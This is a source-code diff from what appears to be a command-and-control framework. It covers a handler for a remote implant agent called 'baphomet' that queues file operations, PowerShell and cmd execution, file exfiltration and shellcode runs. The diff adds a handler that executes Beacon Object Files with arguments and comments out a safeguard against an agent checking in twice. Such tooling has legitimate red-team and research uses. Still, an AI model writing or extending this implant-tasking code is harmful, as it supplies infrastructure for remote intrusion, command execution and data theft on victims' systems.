@@ -21,6 +21,7 @@ lurch::baphomet::cp(reciever_context& ctx) {
     );
 }
 
+
 lurch::result<std::string>
 lurch::baphomet::cat(reciever_context& ctx) {
     return generic_queue_task(
@@ -29,6 +30,7 @@ lurch::baphomet::cat(reciever_context& ctx) {
         "Successfully queued cat."
     );
 }
+
 
 lurch::result<std::string>
 lurch::baphomet::cd(reciever_context& ctx) {
@@ -39,6 +41,7 @@ lurch::baphomet::cd(reciever_context& ctx) {
     );
 }
 
+
 lurch::result<std::string>
 lurch::baphomet::mkdir(reciever_context& ctx) {
     return generic_queue_task(
@@ -47,6 +50,7 @@ lurch::baphomet::mkdir(reciever_context& ctx) {
        "Successfully queued directory creation."
     );
 }
+
 
 lurch::result<std::string>
 lurch::baphomet::rm(reciever_context& ctx) {
@@ -57,6 +61,7 @@ lurch::baphomet::rm(reciever_context& ctx) {
     );
 }
 
+
 lurch::result<std::string>
 lurch::baphomet::ps(reciever_context& ctx) {
     return generic_queue_task(
@@ -65,6 +70,7 @@ lurch::baphomet::ps(reciever_context& ctx) {
         "Successfully queued powershell command to be ran."
     );
 }
+
 
 lurch::result<std::string>
 lurch::baphomet::cmd(reciever_context& ctx) {
@@ -75,6 +81,7 @@ lurch::baphomet::cmd(reciever_context& ctx) {
     );
 }
 
+
 lurch::result<std::string>
 lurch::baphomet::exfil(reciever_context& ctx) {
     return generic_queue_task(
@@ -83,6 +90,7 @@ lurch::baphomet::exfil(reciever_context& ctx) {
          "Successfully queued file to be uploaded."
     );
 }
+
 
 lurch::result<std::string>
 lurch::baphomet::indicate_exit(reciever_context &ctx) {
@@ -97,18 +105,55 @@ lurch::baphomet::indicate_exit(reciever_context &ctx) {
     return OBJECT_EMPTY_RESPONSE;
 }
 
+
 lurch::result<std::string>
 lurch::baphomet::checkin(reciever_context &ctx) {
-
+    /*
     if(!connected_agent_data.ip.empty() || !connected_agent_data.token.empty()) {
         return error("Checkin requested, but this object is already in use.");
     }
-
+    */
     connected_agent_data.ip     = ctx.address;
     connected_agent_data.token  = ctx.tok.token;
 
     return { io::format_str("Baphomet agent checked in from: {}", ctx.address) };
 }
+
+
+lurch::result<std::string>
+lurch::baphomet::runbof(reciever_context &ctx) {
+
+    const auto [file_name, bof_args] =
+        ctx.cmd.get<std::string>("--staged-file", "-sf")
+            .with<std::string>("--arguments", "-a")
+            .done();
+
+    if(!file_is_staged(*file_name)) {
+        return error("that file has not been staged.");
+    }
+
+
+    if(bof_args) {
+        for(const char& c : *bof_args) {
+            if(c == AGENT_DELIMITING_CHAR) {
+                return error(io::format_str("your arguments must not contain these characters: {}", AGENT_DELIMITING_CHAR));
+            }
+        }
+
+        return generic_queue_task(
+            ctx.cmd,
+            {*file_name, *bof_args},
+            "Queued a Beacon Object File to be executed with arguments."
+        );
+    }
+
+    return generic_queue_task(
+        ctx.cmd,
+        {*file_name},
+        "Queued a Beacon Object File to be executed without arguments."
+    );
+}
+
 
 lurch::result<std::string>
 lurch::baphomet::runshellcode(reciever_context& ctx) {
